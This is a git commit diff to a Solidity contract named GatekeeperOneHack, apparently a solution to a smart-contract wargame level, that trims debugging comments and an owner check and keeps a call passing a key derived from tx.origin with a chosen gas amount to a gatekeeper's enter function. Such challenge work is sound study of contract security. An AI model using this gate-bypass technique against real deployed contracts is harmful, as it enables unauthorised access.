e60fc4534371066c2164b54cb490a8f396be94df
strood <stroodz19@gmail.com>
2023-03-05 14:55:47 -0700

    gk1

--- src/GatekeeperOneHack.sol
+++ src/GatekeeperOneHack.sol
@@ -19,20 +19,8 @@ contract GatekeeperOneHack {
 
 
   function enterGate(uint256 _gas) external {
-    require(msg.sender == owner);
-    uint16 k16 = uint16(uint160(tx.origin));
-    uint64 k64 = uint64(1 << 63) + uint64(k16);
-    bytes8 key = bytes8(k64);
 
     bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
-    // bytes8 key = bytes8(uint64(uint160(address(0x359bfB5160946a55f03c080c2DC6975C8F970d5C)))) & 0xFFFFFFFF0000FFFF;
-    // require(tx.origin == 0x359bfB5160946a55f03c080c2DC6975C8F970d5C, 'fail');
-    // require(gatekeeper.enter{ gas: 8191 * 10 + _gas}(key), "failed");
-    // (bool sent ) = gatekeeper.enter{ gas: 82166}(key);
     (bool sent ) = gatekeeper.enter{ gas: _gas}(gateKey);
-    // require(sent);
-    // require(gatekeeper.enter{ gas: 82166}(key), "failed");
-    // require(gatekeeper.entrant() == 0x359bfB5160946a55f03c080c2DC6975C8F970d5C, "failed, wrong entrant");
-    // This passes... but when run live I dont get entrant. Not sure why
   }
 }
